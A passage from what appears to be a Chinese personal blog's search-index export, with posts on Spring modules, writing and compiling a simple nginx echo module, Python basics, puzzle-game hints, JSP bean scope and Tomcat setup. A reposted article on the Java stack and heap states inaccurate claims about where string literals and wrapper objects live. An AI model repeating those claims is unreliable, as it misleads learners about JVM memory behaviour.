POJOs 进行开发，使应用程序更容易测试、更容易管理。而且核心 JAR 包非常小，Spring3.0.5 不到 1 M ，而且不需要依赖任何应用服务器，可以部署在任何环境（ Java SE 或 Java EE ）。 AOP： AOP 是 Aspect Oriented Programming 的缩写，意思是面向切面编程。从另一个角度来考虑程序结构以完善面向对象编程（ OOP ），即可以通过在编译期间、装载期间或运行期间实现在不修改源代码的情况下给程序动态添加功能的一种技术。通俗点说就是把可重用的功能提取出来，然后将这些通用功能在合适的时候织入到应用程序中；比如安全，日志记录，这些都是通用的功能，我们可以把它们提取出来，然后在程序执行的合适地方植入这些代码并执行它们，从而完成需要的功能并复用了这些功能。 简单的数据库事务管理：在使用数据库的应用程序当中，自己管理数据库事务是一项很让人头疼的事，而且很容易出现错误，Spring 支持可插入的事务管理支持，而且无需 JavaEE 环境支持，通过 Spring 管理事务可以把我们从事务管理中解放出来来专注业务逻辑。 JDBC 抽象及 ORM （对象关系映射）框架支持： Spring 使 JDBC 更加容易使用；提供 DAO（数据访问对象）支持，非常方便集成第三方 ORM 框架，比如 Hibernate 等；并且完全支持 Spring 事务和使用 Spring 提供的一致的异常体系。 灵活的 Web 层支持： Spring 本身提供一套非常强大的 MVC 框架，而且可以非常容易的与第三方 MVC 框架集成，比如 Struts 等。 简化各种技术集成：提供对 Java Mail 、任务调度、 JMX 、 JMS 、 JNDI 、 EJB 、动态语言、远程访问、 Web Service 等的集成。 Spring 能帮助我们简化应用程序开发，帮助我们创建和组装对象，为我们管理事务，简单的 MVC 框架，可以把 Spring 看作是一个超级粘合平台，能把很多技术整合在一起，形成一个整体，使系统结构更优良、性能更出众，从而加速我们程序开发，有如上优点，我们没有理由不考虑使用它。 4. Spring 架构图 4.1核心容器：包括 Core 、 Beans 、 Context 、 EL 模块 Core 模块：封装了框架依赖的最底层部分，包括资源访问、类型转换及一些常用工具类。 Beans 模块：提供了框架的基础部分，包括控制反转（ IOC ）和依赖注入（ DI ）。其中 BeanFactory 是容器核心，本质是“工厂设计模式”的实现，而且无需编程实现“单例设计模式”，单例完全由容器控制，而且提倡面向接口编程，而非面向实现编程；所有应用程序对象及对象间关系由框架管理，从而真正从程序逻辑中把维护对象之间的依赖关系提取出来，所有这些依赖关系都由 BeanFactory 来维护。 Context 模块：以 Core 和 Beans 为基础，集成 Beans 模块功能并添加资源绑定、数据验证、国际化、 Java EE 支持、容器生命周期、事件传播等；核心接口是 ApplicationContext 。 EL 模块：提供强大的表达式语言支持，支持访问和修改属性值，方法调用，支持访问及修改数组、容器和索引器，命名变量，支持算数和逻辑运算，支持从 Spring 容器获取 Bean， 它也支持列表投影、选择和一般的列表聚合等. 4.2 AOP 、 Aspects 模块： AOP 模块： Spring AOP 模块提供了符合 AOP Alliance 规范的面向切面的编程（ aspect-oriented programming ）实现，提供比如日志记录、权限控制、性能统计等通用功能和业务逻辑分离的技术，并且能动态的把这些功能添加到需要的代码中；这样各专其职，降低业务逻辑和通用功能的耦合。 Aspects 模块：提供了对 AspectJ 的集成，AspectJ 提供了比 Spring ASP 更强大的功能。数据访问/集成模块：该模块包括了 JDBC 、 ORM 、 OXM 、 JMS 和事务管理。 事务模块：该模块用于 Spring 管理事务，只要是 Spring 管理对象都能得到 Spring 管理事务的好处，无需在代码中进行事务控制了，而且支持编程和声明性的事务管理。 JDBC 模块：提供了一个 JBDC 的样例模板，使用这些模板能消除传统冗长的 JDBC 编码还有必须的事务控制，而且能享受到 Spring 管理事务的好处。 ORM 模块：提供与流行的“对象-关系”映射框架的无缝集成，包括 Hibernate 、JPA 、 MyBatis 等。而且可以使用 Spring 事务管理，无需额外控制事务。 OXM 模块：提供了一个对 Object / XML 映射实现，将 java 对象映射成 XML 数据，或者将 XML 数据映射成 java 对象， Object / XML 映射实现包括 JAXB 、 Castor 、 XMLBeans 和 XStream 。 JMS 模块：用于 JMS ( Java Messaging Service )，提供一套 “消息生产者、消息消费者”模板用于更加简单的使用 JMS ， JMS 用于用于在两个应用程序之间，或分布式系统中发送消息，进行异步通信。 Web / Remoting 模块： Web / Remoting 模块包含了 Web 、 Web-Servlet 、 Web-Struts 、 Web-Porlet 模块。 Web 模块：提供了基础的 web 功能。例如多文件上传、集成 IoC 容器、远程过程访问（ RMI 、Hessian 、 Burlap ）以及 Web Service 支持，并提供一个 RestTemplate 类来提供方便的 Restful services 访问。 Web-Servlet 模块：提供了一个 Spring MVC Web 框架实现。Spring MVC 框架提供了基于注解的请求资源注入、更简单的数据绑定、数据验证等及一套非常易用的 JSP 标签，完全无缝与 Spring 其他技术协作。 Web-Struts 模块：提供了与 Struts 无缝集成， Struts1.x 和 Struts2.x 都支持。 Test 模块： Spring 支持 Junit 和 TestNG 测试框架，而且还额外提供了一些基于 Spring 的测试功能，比如在测试 Web 框架时，模拟 Http 请求的功能。","tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"}]},{"title":"succeed_in_build_nginx_module","date":"2017-03-22T13:31:34.000Z","path":"2017/03/22/succeed-in-build-nginx-module/","text":"开发nginx入门竟然成功了，下面就是我的路程向上图说明一下nginx模块工作流程 工具准备 ubuntu虚拟机 nginx源文件 *Note 鉴于博客是我自己看我就只是记录一些关键步骤 Nginx在Linux下的安装与运行tar -zxvf archive_name.tar.gz 解压文件命令 编译安装原文件用以下命令 ./configure --prefix=/usr/local/nginx make make install *note 这里给出编译安装nginx中使用到的命令 --prefix=指定安装目录 --add-module=连带模块一起便已安装的模块路径 模块的目录结构是module.c以及config文件 安装完成后可以直接使用下面命令启动Nginx： /usr/local/nginx/sbin/nginx Nginx默认以Deamon进程启动，输入下列命令： curl -i http://localhost/ 就可以检测Nginx是否已经成功运行。或者也可以在浏览器中输入http://localhost/，应该可以看到Nginx的欢迎页面了。启动后如果想停止Nginx可以使用： /usr/local/nginx/sbin/nginx -s stop 开发模块源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148 #include&lt;ngx_config.h&gt;#include&lt;ngx_core.h&gt;#include&lt;ngx_http.h&gt;//定义模块配置结构typedef struct&#123; ngx_str_t ed;//用于存储echo指令指定输出字符串&#125;ngx_http_echo_loc_conf_t;//函数声明static char *ngx_http_echo(ngx_conf_t *cf, ngx_command_t *cmd, void *conf);static void *ngx_http_echo_create_loc_conf(ngx_conf_t *cf);static char *ngx_http_echo_merge_loc_conf(ngx_conf_t *cf, void *parent, void *child);//定义指令static ngx_command_t ngx_http_echo_commands[]=&#123;&#123; ngx_string(\"echo\"), NGX_HTTP_LOC_CONF|NGX_CONF_TAKE1, ngx_http_echo, NGX_HTTP_LOC_CONF_OFFSET, offsetof(ngx_http_echo_loc_conf_t, ed), NULL&#125;,ngx_null_command//指令数组最后一个结尾元素&#125;;//模块echo的context结构配置 static ngx_http_module_t ngx_http_echo_module_ctx=&#123; NULL, //pre configuration NULL, //post configuration NULL, //create main configuration NULL, //init main configuration NULL, //create server configuration NULL, //merge server configuration ngx_http_echo_create_loc_conf, //create location configuration ngx_http_echo_merge_loc_conf //merge location configuration&#125;;//echo模块的模块主体定义ngx_module_t ngx_http_echo_module = &#123; NGX_MODULE_V1, &amp;ngx_http_echo_module_ctx, /* module context */ ngx_http_echo_commands, /* module directives*/ NGX_HTTP_MODULE, /* module type */ NULL, /* init master */ NULL, /* init module */ NULL, /* init process */ NULL, /* init thread */ NULL, /* exit thread */ NULL, /* exit process */ NULL, /* exit master */ NGX_MODULE_V1_PADDING&#125;;/**模块的handler函数编写.主要有4个职责* 读入模块配置* 处理业务功能* 产生HTTP Header* 产生HTTP body*/static ngx_int_t ngx_http_echo_handler(ngx_http_request_t *r)&#123; ngx_int_t rc; ngx_buf_t *b; ngx_chain_t out; ngx_http_echo_loc_conf_t *elcf; elcf = ngx_http_get_module_loc_conf(r, ngx_http_echo_module); if(!(r-&gt;method &amp; (NGX_HTTP_HEAD | NGX_HTTP_GET | NGX_HTTP_POST))) &#123; return NGX_HTTP_NOT_ALLOWED; &#125; r-&gt;headers_out.content_type.len = sizeof(\"text/html\")-1; r-&gt;headers_out.content_type.data = (u_char *)\"text/html\"; r-&gt;headers_out.status = NGX_HTTP_OK; r-&gt;headers_out.content_length_n = elcf-&gt;ed.len; if(r-&gt;method == NGX_HTTP_HEAD) &#123; rc = ngx_http_send_header(r); if(rc != NGX_OK) &#123; return rc; &#125; &#125; b = ngx_pcalloc(r-&gt;pool, sizeof(ngx_buf_t)); if(b == NULL) &#123; ngx_log_error(NGX_LOG_ERR, r-&gt;connection-&gt;log, 0, \"Fail to allocate response buffer.\"); return NGX_HTTP_INTERNAL_SERVER_ERROR; &#125; out.buf = b; out.next = NULL; b-&gt;pos = elcf-&gt;ed.data; b-&gt;last = elcf-&gt;ed.data + (elcf-&gt;ed.len); b-&gt;memory =1; b-&gt;last_buf = 1; rc = ngx_http_send_header(r); if(rc != NGX_OK) &#123; return rc; &#125; return ngx_http_output_filter(r, &amp;out);&#125;//指令中函数指针的实现static char* ngx_http_echo(ngx_conf_t *cf, ngx_command_t *cmd, void *conf)&#123; ngx_http_core_loc_conf_t *clcf; clcf = ngx_http_conf_get_module_loc_conf(cf, ngx_http_core_module); clcf-&gt;handler = ngx_http_echo_handler; ngx_conf_set_str_slot(cf, cmd, conf); return NGX_CONF_OK;&#125;//初始化一个配置结构体static void* ngx_http_echo_create_loc_conf(ngx_conf_t *cf)&#123; ngx_http_echo_loc_conf_t *conf; conf = ngx_pcalloc(cf-&gt;pool, sizeof(ngx_http_echo_loc_conf_t)); if(conf == NULL) &#123; return NGX_CONF_ERROR; &#125; conf-&gt;ed.len = 0; conf-&gt;ed.data = NULL; return conf;&#125;//合并配置结构体(将父类配置信息合并到此)static char* ngx_http_echo_merge_loc_conf(ngx_conf_t *cf, void *parent,void *child)&#123; ngx_http_echo_loc_conf_t *pre = parent; ngx_http_echo_loc_conf_t *conf = child; ngx_conf_merge_str_value(conf-&gt;ed, pre-&gt;ed, \"\")//具体合并的实现是一个宏定义 return NGX_CONF_OK;&#125; Nginx模块的安装Nginx不支持动态链接模块，所以安装模块需要将模块代码与Nginx源代码进行重新编译。安装模块的步骤如下： 1、编写模块config文件，这个文件需要放在和模块源代码文件放在同一目录下。文件内容如下： ngx_addon_name=模块完整名称 HTTP_MODULES=&quot;$HTTP_MODULES 模块完整名称&quot; NGX_ADDON_SRCS=&quot;$NGX_ADDON_SRCS $ngx_addon_dir/源代码文件名&quot; 2、进入Nginx源代码，使用下面命令编译安装 ./configure --prefix=安装目录 --add-module=模块源代码文件目录 make make install 这样就完成安装了，例如，我的源代码文件放在/home/yefeng/ngxdev/ngx_http_echo下，我的config文件为： ngx_addon_name=ngx_http_echo_module HTTP_MODULES=&quot;$HTTP_MODULES ngx_http_echo_module&quot; NGX_ADDON_SRCS=&quot;$NGX_ADDON_SRCS $ngx_addon_dir/ngx_http_echo_module.c&quot; 编译安装命令为： ./configure --prefix=/usr/local/nginx --add-module=/home/laowang/ngxdev/ngx_http_echo make sudo make install 这样echo模块就被安装在我的Nginx上了，下面测试一下，修改配置文件，增加以下一项配置： location /echo { echo &quot;This is my first nginx module!!!&quot;; } 然后用curl测试一下： curl -i http://localhost/echo 这里附上此次在ubuntu上用到的命令行 ps -ef |grep nginx 查看nginx的进程 nginx -s reload 重新加载nginx的配置文件 pwd 查看当前工作路径 提醒 本次实践完全是在root环境下的，整个过程很多地方都用sudo 再接再厉参考博客","tags":[{"name":"nginx","slug":"nginx","permalink":"http://yoursite.com/tags/nginx/"}]},{"title":"nginxNote","date":"2017-03-19T15:47:57.000Z","path":"2017/03/19/nginxNote/","text":"Nginx模块开发笔记预备知识1.C语言的结构体和预处理命令以及指针相关知识。 2.HTTP协议的基本了解。 3.Nginx的基本配置 Nginx 配置文件主要分成四部分： main（全局设置）、 server（主机设置） 、upstream（上游服务器设置）和location（URL匹配特定位置后的设置） 。 每部分包含若干个指令。 main 部分设置的指令将影响其它所有部分； server 部分的指令主要用于指定主机和端口； upstream 的指令用于设置后端服务器；location 部分用于匹配网页位置（比如， 根目录“/”,“/images” 等等） 。Location 部分会继承 server 部分的指令，而 server 部分的指令会继承 main 部分； upstream 既不继承指令也不会影响其他部分。 它有自己的特殊指令，不需要在其他地方的应用。 Nginx 模块主要有 3 种角色 handlers(处理模块) 用于处理 HTTP 请求， 然后产生输出 filters（过滤模块） 过滤 handler 产生的输出 load-balancers（负载均衡模块） 当有多于一台的后端备选服务器时， 选择一台转发 HTTP 请求 一个典型的处理周期是这样的 客户 端发送 HTTP 请求-&gt;Nginx 根据配置选择一个合适的处理模块-&gt;（如果有）负载均衡模块选择一台后端服务器，并负责完成后端的发送接收过程-&gt;处理模块进行处理并把输出缓冲放到第一个过滤模块上-&gt;第一个过滤模块处理后输出给第二个过滤模块-&gt;然后第二个过滤模块又到第三个-&gt;依此类推-&gt;最后把回复发给客户 端。 Nginx启动，关闭，重启看这个博客 Nginx模块开发入门博客比较好的一篇博客 还有一个不错的博客","tags":[{"name":"Nginx","slug":"Nginx","permalink":"http://yoursite.com/tags/Nginx/"}]},{"title":"PythonNote","date":"2017-03-19T07:00:39.000Z","path":"2017/03/19/PythonNote/","text":"python note1.Python的字符串对于单个字符的编码，Python提供了ord()函数获取字符的整数表示，chr()函数把编码转换为对应的字符： &gt;&gt;&gt; ord(&apos;A&apos;) 65 &gt;&gt;&gt; ord(&apos;中&apos;) 20013 &gt;&gt;&gt; chr(66) &apos;B&apos; &gt;&gt;&gt; chr(25991) &apos;文&apos; 输出 &gt;&gt;&gt; &apos;\\u4e2d\\u6587&apos; &apos;中文&apos; 2.常见的占位符%d 整数 %f 浮点数 %s 字符串 %x 十六进制整数 NOTE 有些时候，字符串里面的%是一个普通字符怎么办？这个时候就需要转义，用%%来表示一个%： &gt;&gt;&gt; &apos;growth rate: %d %%&apos; % 7 &apos;growth rate: 7 %&apos; 返回多个值输入 import math def move(x, y, step, angle=0): nx = x + step * math.cos(angle) ny = y - step * math.sin(angle) return nx, ny 输出 &gt;&gt;&gt; x, y = move(100, 100, 60, math.pi / 6) &gt;&gt;&gt; print(x, y) 151.96152422706632 70.0 返回值是一个tuple！但是，在语法上，返回一个tuple可以省略括号，而多个变量可以同时接收一个tuple，按位置赋给对应的值，所以，Python的函数返回多值其实就是返回一个tuple，但写起来更方便。 默认参数必须指向不变对象例如 def add_end(L=[]): L.append(&apos;END&apos;) return L &gt;&gt;&gt; add_end() [&apos;END&apos;, &apos;END&apos;] &gt;&gt;&gt; add_end() [&apos;END&apos;, &apos;END&apos;, &apos;END&apos;] 原因:Python函数在定义的时候，默认参数L的值就被计算出来了，即[]，因为默认参数L也是一个变量，它指向对象[]，每次调用该函数，如果改变了L的内容，则下次调用时，默认参数的内容就变了，不再是函数定义时的[]了。 修改 def add_end(L=None): if L is None: L = [] L.append(&apos;END&apos;) return L 可变参数的函数def calc(*numbers): sum = 0 for n in numbers: sum = sum + n * n return sum 如果已经有一个list或者tuple，可以这样做： &gt;&gt;&gt; nums = [1, 2, 3] &gt;&gt;&gt; calc(*nums) 14 函数小结 Python的函数具有非常灵活的参数形态，既可以实现简单的调用，又可以传入非常复杂的参数。 默认参数一定要用不可变对象，如果是可变对象，程序运行时会有逻辑错误！ 要注意定义可变参数和关键字参数的语法： *args是可变参数，args接收的是一个tuple； **kw是关键字参数，kw接收的是一个dict。 以及调用函数时如何传入可变参数和关键字参数的语法： 可变参数既可以直接传入：func(1, 2, 3)，又可以先组装list或tuple，再通过args传入：func((1, 2, 3))； 关键字参数既可以直接传入：func(a=1, b=2)，又可以先组装dict，再通过kw传入：func({‘a’: 1, ‘b’: 2})。 使用args和*kw是Python的习惯写法，当然也可以用其他参数名，但最好使用习惯用法。 命名的关键字参数是为了限制调用者可以传入的参数名，同时可以提供默认值。 定义命名的关键字参数在没有可变参数的情况下不要忘了写分隔符*，否则定义的将是位置参数。 切片&gt;&gt;&gt; L = list(range(100)) &gt;&gt;&gt; L [0, 1, 2, 3, ..., 99] 前10个数： &gt;&gt;&gt; L[:10] [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 后10个数： &gt;&gt;&gt; L[-10:] [90, 91, 92, 93, 94, 95, 96, 97, 98, 99] 前11-20个数： &gt;&gt;&gt; L[10:20] [10, 11, 12, 13, 14, 15, 16, 17, 18, 19] 前10个数，每两个取一个： &gt;&gt;&gt; L[:10:2] [0, 2, 4, 6, 8] 所有数，每5个取一个： &gt;&gt;&gt; L[::5] [0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 60, 65, 70, 75, 80, 85, 90, 95] 甚至什么都不写，只写[:]就可以原样复制一个list： &gt;&gt;&gt; L[:] [0, 1, 2, 3, ..., 99] tuple也是一种list，唯一区别是tuple不可变。因此，tuple也可以用切片操作，只是操作的结果仍是tuple： &gt;&gt;&gt; (0, 1, 2, 3, 4, 5)[:3] (0, 1, 2) 字符串’xxx’也可以看成是一种list，每个元素就是一个字符。因此，字符串也可以用切片操作，只是操作结果仍是字符串： &gt;&gt;&gt; &apos;ABCDEFG&apos;[:3] &apos;ABC&apos; &gt;&gt;&gt; &apos;ABCDEFG&apos;[::2] &apos;ACEG&apos; 迭代 默认情况下，dict迭代的是key。如果要迭代value，可以用for value in d.values()，如果要同时迭代key和value，可以用for k, v in d.items()。 判断一个对象是可迭代对象的方法是通过collections模块的Iterable类型判断： &gt;&gt;&gt; from collections import Iterable &gt;&gt;&gt; isinstance(&apos;abc&apos;, Iterable) # str是否可迭代 True &gt;&gt;&gt; isinstance([1,2,3], Iterable) # list是否可迭代 True &gt;&gt;&gt; isinstance(123, Iterable) # 整数是否可迭代 False 如果要对list实现类似Java那样的下标循环怎么办？Python内置的enumerate函数可以把一个list变成索引-元素对，这样就可以在for循环中同时迭代索引和元素本身： &gt;&gt;&gt; for i, value in enumerate([&apos;A&apos;, &apos;B&apos;, &apos;C&apos;]): ... print(i, value) ... 0 A 1 B 2 C 上面的for循环里，同时引用了两个变量，在Python里是很常见的，比如下面的代码： &gt;&gt;&gt; for x, y in [(1, 1), (2, 4), (3, 9)]: ... print(x, y) ... 1 1 2 4 3 9 列表解析 &gt;&gt;&gt; [x * x for x in range(1, 11)] [1, 4, 9, 16, 25, 36, 49, 64, 81, 100] &gt;&gt;&gt; [m + n for m in &apos;ABC&apos; for n in &apos;XYZ&apos;] [&apos;AX&apos;, &apos;AY&apos;, &apos;AZ&apos;, &apos;BX&apos;, &apos;BY&apos;, &apos;BZ&apos;, &apos;CX&apos;, &apos;CY&apos;, &apos;CZ&apos;] 运用列表生成式，可以写出非常简洁的代码。例如，列出当前目录下的所有文件和目录名，可以通过一行代码实现： &gt;&gt;&gt; import os # 导入os模块，模块的概念后面讲到 &gt;&gt;&gt; [d for d in os.listdir(&apos;.&apos;)] # os.listdir可以列出文件和目录 [&apos;.emacs.d&apos;, &apos;.ssh&apos;, &apos;.Trash&apos;, &apos;Adlm&apos;, &apos;Applications&apos;, &apos;Desktop&apos;, &apos;Documents&apos;, &apos;Downloads&apos;, &apos;Library&apos;, &apos;Movies&apos;, &apos;Music&apos;, &apos;Pictures&apos;, &apos;Public&apos;, &apos;VirtualBox VMs&apos;, &apos;Workspace&apos;, &apos;XCode&apos;] 列表生成式也可以使用两个变量来生成list： &gt;&gt;&gt; d = {&apos;x&apos;: &apos;A&apos;, &apos;y&apos;: &apos;B&apos;, &apos;z&apos;: &apos;C&apos; } &gt;&gt;&gt; [k + &apos;=&apos; + v for k, v in d.items()] [&apos;y=B&apos;, &apos;x=A&apos;, &apos;z=C&apos;] 最后把一个list中所有的字符串变成小写： &gt;&gt;&gt; L = [&apos;Hello&apos;, &apos;World&apos;, &apos;IBM&apos;, &apos;Apple&apos;] &gt;&gt;&gt; [s.lower() for s in L] [&apos;hello&apos;, &apos;world&apos;, &apos;ibm&apos;, &apos;apple&apos;] 函数是编程 把函数作为参数传入，这样的函数称为高阶函数，函数式编程就是指这种高度抽象的编程范式。 Python内建map()和reduce()函数&gt;&gt;&gt; def f(x): ... return x * x ... &gt;&gt;&gt; r = map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9]) &gt;&gt;&gt; list(r) [1, 4, 9, 16, 25, 36, 49, 64, 81] map()传入的第一个参数是f，即函数对象本身。由于结果r是一个Iterator，Iterator是惰性序列，因此通过list()函数让它把整个序列都计算出来并返回一个list。 map()作为高阶函数，事实上它把运算规则抽象了，因此，我们不但可以计算简单的f(x)=x2，还可以计算任意复杂的函数，比如，把这个list所有数字转为字符串： &gt;&gt;&gt; list(map(str, [1, 2, 3, 4, 5, 6, 7, 8, 9])) [&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;] 装饰器在代码运行期间动态增加功能的方式，称之为“装饰器”（Decorator）。本质上，decorator就是一个返回函数的高阶函数。 装饰器","tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"梦之光芒小游戏","date":"2017-01-15T06:38:48.000Z","path":"2017/01/15/梦之光芒小游戏/","text":"第一关查看源代码即可 第二关 第三关 第四关先将string.fromCharCode()翻译过来 翻译过后能看到答案d4g","tags":[{"name":"闯关游戏","slug":"闯关游戏","permalink":"http://yoursite.com/tags/闯关游戏/"}]},{"title":"jsp传递bean到servlet为null","date":"2016-12-12T15:34:10.000Z","path":"2016/12/12/jsp传递bean到servlet为null/","text":"jsp 中使用 1&lt;jsp:useBean id=\"user\" scope=\"request\" class=\"bean.User\"&gt; id是bean的引用名（绑定的名字） scope作用域（request|session|application） class对象所属类的完全限定名 问题： 在jsp中使用上述方法，在servlet中获得的user 为null原因分析 jsp的编译完以后就是servlet，显示完成那个jsp页面完了以后，就已经是一次request了。因此在jsp中创建一个scope=”request”的bean只能在 jsp中、或者是jsp通过传递方式给其他对象才能用这个bean即使你jsp中提交的表单给另外一个servlet的，那已经是第二次request。对应的解决就是更改作用域范围为session。 jsp页面中javabean的属性设置是依靠 jsp engine帮你实现的。如果表单提交到了servlet，意味着你就失去了jsp engine这个优势，需要自己set这些属性。 如果提交给servlet，是在servlet中set这些属性。那么形成表单的页面的jsp文件中就没有必要用javabean。javabean的用法是在提交以后的那个页面，而非形成表单的页面，除非要显示或者计算用途 解决方法 方法一 设置作用域scope为session 在servlet中设置user的各个属性 在servlet中再将user绑定到session，在后就可以转发 方法二 在表单提交中不是用useBean","tags":[{"name":"jsp","slug":"jsp","permalink":"http://yoursite.com/tags/jsp/"}]},{"title":"tomcatstartup","date":"2016-11-28T14:58:14.000Z","path":"2016/11/28/tomcatstartup/","text":"启动tomcat报错Error deploying configuration descriptor 导致原因 servlet创建时有 @WebServlet(“/UploadFile”) 这个注解导致报错 报错图片","tags":[{"name":"tomcat","slug":"tomcat","permalink":"http://yoursite.com/tags/tomcat/"}]},{"title":"tomcatinstall","date":"2016-10-02T01:29:17.000Z","path":"2016/10/02/tomcatinstall/","text":"安装和配置tomcat的小坑1.下载tomcat去这个tomcat.apache.org网址下载core的zip包 2.安装tomcat将下载的tomcat解压缩就安装成功了 3.1windows下tomcat的配置设置环境变量 CATALINA_HOME C:\\Users\\wangyonghao8\\Desktop\\java文档\\tomcat\\apache-tomcat-7.0.72 note * 1.注意环境变量设置的路径是安装tomcat的路径，不是其下的bin目录 2.必须确保jdk配置成功才能成功启动tomcat 3.2eclipse下安装tomcata.打开eclipsewindows -&gt; preference -&gt; server -&gt; runtime Environment b.选择add按钮，选择对应的tomcat安装，然后选择Edit选择tomcat # 安装目录 # 4。启动tomcatwidows下直接到安装目录下的bin目录中打开startup.bat即可 eclipse中打开server视图，右击选择启动按钮即可","tags":[{"name":"tomcat","slug":"tomcat","permalink":"http://yoursite.com/tags/tomcat/"}]},{"title":"java中的堆和栈","date":"2016-09-25T01:24:03.000Z","path":"2016/09/25/java中的堆和栈/","text":"Java栈与堆—-对这两个概念的不明好久，终于找到一篇好文，拿来共享 栈(stack)与堆(heap)都是Java用来在Ram中存放数据的地方。与C++不同，Java自动管理栈和堆，程序员不能直接地设置栈或堆。 栈的优势是，存取速度比堆要快，仅次于直接位于CPU中的寄存器。但缺点是，存在栈中的数据大小与生存期必须是确定的，缺乏灵活性。另外，栈数据可以共享，详见第3点。堆的优势是可以动态地分配内存大小，生存期也不必事先告诉编译器，Java的垃圾收集器会自动收走这些不再使用的数据。但缺点是，由于要在运行时动态分配内存，存取速度较慢。 Java中的数据类型有两种。 一种是基本类型(primitive types), 共有8种，即int, short, long, byte, float, double, boolean, char(注意，并没有string的基本类型)。这种类型的定义是通过诸如int a = 3; long b = 255L;的形式来定义的，称为自动变量。值得注意的是，自动变量存的是字面值，不是类的实例，即不是类的引用，这里并没有类的存在。如int a = 3; 这里的a是一个指向int类型的引用，指向3这个字面值。这些字面值的数据，由于大小可知，生存期可知(这些字面值固定定义在某个程序块里面，程序块退出后，字段值就消失了)，出于追求速度的原因，就存在于栈中。 另外，栈有一个很重要的特殊性，就是存在栈中的数据可以共享。假设我们同时定义：复制内容到剪贴板代码:int a = 3;int b = 3；编译器先处理int a = 3；首先它会在栈中创建一个变量为a的引用，然后查找有没有字面值为3的地址，没找到，就开辟一个存放3这个字面值的地址，然后将a指向3的地址。接着处理int b = 3；在创建完b的引用变量后，由于在栈中已经有3这个字面值，便将b直接指向3的地址。这样，就出现了a与b同时均指向3的情况。 特别注意的是，这种字面值的引用与类对象的引用不同。假定两个类对象的引用同时指向一个对象，如果一个对象引用变量修改了这个对象的内部状态，那么另一个对象引用变量也即刻反映出这个变化。相反，通过字面值的引用来修改其值，不会导致另一个指向此字面值的引用的值也跟着改变的情况。如上例，我们定义完a与b的值后，再令a=4；那么，b不会等于4，还是等于3。在编译器内部，遇到a=4；时，它就会重新搜索栈中是否有4的字面值，如果没有，重新开辟地址存放4的值；如果已经有了，则直接将a指向这个地址。因此a值的改变不会影响到b的值。 另一种是包装类数据，如Integer, String, Double等将相应的基本数据类型包装起来的类。这些类数据全部存在于堆中，Java用new()语句来显示地告诉编译器，在运行时才根据需要动态创建，因此比较灵活，但缺点是要占用更多的时间。 4. String是一个特殊的包装类数据。即可以用String str = new String(“abc”);的形式来创建，也可以用String str = “abc”；的形式来创建(作为对比，在JDK 5.0之前，你从未见过Integer i = 3;的表达式，因为类与字面值是不能通用的，除了String。而在JDK 5.0中，这种表达式是可以的！因为编译器在后台进行Integer i = new Integer(3)的转换)。前者是规范的类的创建过程，即在Java中，一切都是对象，而对象是类的实例，全部通过new()的形式来创建。Java中的有些类，如DateFormat类，可以通过该类的getInstance()方法来返回一个新创建的类，似乎违反了此原则。其实不然。该类运用了单例模式来返回类的实例，只不过这个实例是在该类内部通过new()来创建的，而getInstance()向外部隐藏了此细节。那为什么在String str = “abc”；中，并没有通过new()来创建实例，是不是违反了上述原则？其实没有。 关于String str = “abc”的内部工作。Java内部将此语句转化为以下几个步骤： (1)先定义一个名为str的对String类的对象引用变量：String str； (2)在栈中查找有没有存放值为”abc”的地址，如果没有，则开辟一个存放字面值为”abc”的地址，接着创建一个新的String类的对象o，并将o的字符串值指向这个地址，而且在栈中这个地址旁边记下这个引用的对象o。如果已经有了值为”abc”的地址，则查找对象o，并返回o的地址。 (3)将str指向对象o的地址。 值得注意的是，一般String类中字符串值都是直接存值的。但像String str = “abc”；这种场合下，其字符串值却是保存了一个指向存在栈中数据的引用！ 为了更好地说明这个问题，我们可以通过以下的几个代码进行验证。复制内容到剪贴板代码:String str1 = “abc”;String str2 = “abc”;System.out.println(str1==str2); //true注意，我们这里并不用str1.equals(str2)；的方式，因为这将比较两个字符串的值是否相等。==号，根据JDK的说明，只有在两个引用都指向了同一个对象时才返回真值。而我们在这里要看的是，str1与str2是否都指向了同一个对象。结果说明，JVM创建了两个引用str1和str2，但只创建了一个对象，而且两个引用都指向了这个对象。 我们再来更进一步，将以上代码改成：复制内容到剪贴板代码:String str1 = “abc”;String str2 = “abc”;str1 = “bcd”;System.out.println(str1 + “,” + str2); //bcd, abcSystem.out.println(str1==str2); //false这就是说，赋值的变化导致了类对象引用的变化，str1指向了另外一个新对象！而str2仍旧指向原来的对象。上例中，当我们将str1的值改为”bcd”时，JVM发现在栈中没有存放该值的地址，便开辟了这个地址，并创建了一个新的对象，其字符串的值指向这个地址。 事实上，String类被设计成为不可改变(immutable)的类。如果你要改变其值，可以，但JVM在运行时根据新值悄悄创建了一个新对象，然后将这个对象的地址返回给原来类的引用。这个创建过程虽说是完全自动进行的，但它毕竟占用了更多的时间。在对时间要求比较敏感的环境中，会带有一定的不良影响。 再修改原来代码：复制内容到剪贴板代码:String str1 = “abc”;String str2 = “abc”; str1 = “bcd”; String str3 = str1;System.out.println(str3); //bcd String str4 = “bcd”;System.out.println(str1 == str4); //truestr3这个对象的引用直接指向str1所指向的对象(注意，str3并没有创建新对象)。当str1改完其值后，再创建一个String的引用str4，并指向因str1修改值而创建的新的对象。可以发现，这回str4也没有创建新的对象，从而再次实现栈中数据的共享。 我们再接着看以下的代码。复制内容到剪贴板代码:String str1 = new String(“abc”);String str2 = “abc”;System.out.println(str1==str2); //false 创建了两个引用。创建了两个对象。两个引用分别指向不同的两个对象。 String str1 = “abc”;String str2 = new String(“abc”);System.out.println(str1==str2); //false创建了两个引用。创建了两个对象。两个引用分别指向不同的两个对象。 以上两段代码说明，只要是用new()来新建对象的，都会在堆中创建，而且其字符串是单独存值的，即使与栈中的数据相同，也不会与栈中的数据共享。 数据类型包装类的值不可修改。不仅仅是String类的值不可修改，所有的数据类型包装类都不能更改其内部的值。 7. 结论与建议： (1)我们在使用诸如String str = 